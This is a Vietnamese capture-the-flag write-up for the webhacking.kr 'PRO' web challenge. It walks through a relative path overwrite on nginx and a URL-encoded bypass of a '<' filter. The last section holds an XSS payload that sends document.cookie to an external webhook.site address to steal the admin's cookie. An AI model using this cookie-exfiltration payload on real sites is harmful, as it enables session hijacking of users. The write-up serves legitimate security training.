---
title: "webhacking.kr — PRO"
date: 2024-03-18
description: RPO trên nginx để ghi đè một response JSON trả về từ api.php/search, và cách bypass filter thẻ < bằng url-encode.
tags: [writeup, web, rpo, xss]
---

Link challenge: [http://webhacking.kr:10011/](http://webhacking.kr:10011/)

## Phân tích

Sau khi vào trang web, ngoài trừ trang `report` thì không bấm vào được đâu để test tính năng của web nữa,
nên mình đã `Ctrl` + `U` để đọc source code:

![Source code của challenge](/img/posts/webhacking-pro/LvdBUiS.png)

Mình thấy website dùng `XMLHttpRequest` để gọi API tới `api.php/search` cộng với một từ trong mảng
`location[]`.

![Đoạn JS gọi api.php/search](/img/posts/webhacking-pro/DLM6MYh.png)

Gọi thử API theo đúng đường dẫn đó và mình thấy server trả về một object chứa đúng thông tin mà website dùng để hiển thị
khi trỏ chuột vào `hoth`. Có lẽ đây là vị trí truyền dữ liệu duy nhất mà chúng ta kiểm soát.

Mình bắt đầu chèn thử một vài path bất kỳ:

![Thử chèn path](/img/posts/webhacking-pro/8R80OoU.png)

![Thử chèn path](/img/posts/webhacking-pro/mL1ZgPL.png)

![Thử chèn path](/img/posts/webhacking-pro/GhUr5kO.png)

Sau khi thử vài lần mình xác định được web server là nginx, dấu ngoặc `<` `>` và các ký tự trong nó đều bị filter.

Thực sự thì rất là bế tắc. Sau khi đi xin hint thì mình được hint đây là lỗi RPO, bắt đầu đi tìm hiểu về lỗi này.
Sau một hồi tìm doc thì chúng ta có thể thực hiện tấn công RPO với web server nginx bằng url decoding.

## Khai thác

Mình bắt đầu bằng việc tạo một result giả để thay cho `XMLHttpRequest()` được gọi:

```json
{"results":[{"name":"a","terrain":"a","population":"a","diameter":"1"}]}
```

Nếu chỉ để như vậy thì đoạn dữ liệu trả về sẽ kèm theo chữ *not found*:

![Response còn dính chữ not found](/img/posts/webhacking-pro/TxSlime.png)

Để xóa được chữ *not found*, mình dựa vào việc web filter ký tự `<` `>` và dữ liệu bên trong nó nên mình đã thêm vào
payload `<a`:

```text
{"results":[{"name":"a","terrain":"a","population":"a","diameter":"1"}]}<a
```

Và thế là chữ *not found* đã biến mất:

![Chữ not found đã biến mất](/img/posts/webhacking-pro/eWpbAcN.png)

Giờ đến RPO:

```text
http://webhacking.kr:10011/api.php/search/{"results":[{"name":"a","terrain":"a","population":"a","diameter":"1"}]}<a/..%2f..%2f..%2f
```

Vì web server là nginx nên khi mình encode ký tự `/` thành `%2f`, server sẽ không decode, nhưng payload đó được thực
hiện trong JS và nó sẽ hiểu đoạn payload của mình như sau:

```text
http://webhacking.kr:10011/api.php/search/{"results":[{"name":"a","terrain":"a","population":"a","diameter":"1"}]}<a/../../../api.php
```

Và kết quả mình nhận được là:

![RPO thành công](/img/posts/webhacking-pro/xp6RKbT.png)

## Lấy cookie admin

Đã RPO thành công, giờ mình cần XSS để lấy cookie admin. Nhưng vấn đề ở đây là ký tự `<` đã bị filter và web sẽ xóa
hết những gì giữa `<` và `>`, vậy nên giờ mình phải bypass ký tự `<`. Sau một hồi tìm kiếm thì mình sử dụng unicode và
url encode để bypass: `<` = `%5cu003c`.

Payload:

```text
{"results":[{"name":"%5cu003cimg src=a onerror=location.href='https://webhook.site/19f12290-974f-4ea8-9e5b-84af2806beff?c='+document.cookie>","terrain":"a","population":"a","diameter":"1"}]}<a/..%2f..%2f..%2f
```

Và vẫn giống như challenge trước `T.T` — mình tự test trên trình duyệt thì được, nhưng khi report cho admin thì chờ
mãi không thấy cookie của admin đâu.

![Kết quả khi report cho admin](/img/posts/webhacking-pro/ttoIt2w.png)
